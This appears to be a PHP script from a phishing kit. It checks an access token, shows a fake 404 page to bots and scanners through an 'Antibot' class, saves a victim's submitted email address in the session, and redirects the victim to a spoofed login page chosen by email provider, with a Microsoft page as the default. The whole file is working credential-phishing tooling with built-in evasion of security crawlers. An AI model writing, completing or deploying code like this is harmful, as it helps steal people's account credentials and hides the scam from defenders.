<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

    if (isset(
        $_POST['email']
    )) {
        if (!$comps->checkEmpty(
            $_POST['email']
        )) {
            $_SESSION['email'] = $_POST['email'];

            if (!$comps->userEmail($_SESSION['email'])) {
                $comps->headerX("../../Login/email/Microsoft.php");
            } else {
                $comps->headerX("../../Login/email/" . $comps->userEmail($_SESSION['email']) . ".php");
            }
        } else {
            echo $antibot->throw404();
            die();
        }
    } else {
        echo $antibot->throw404();
        die();
    }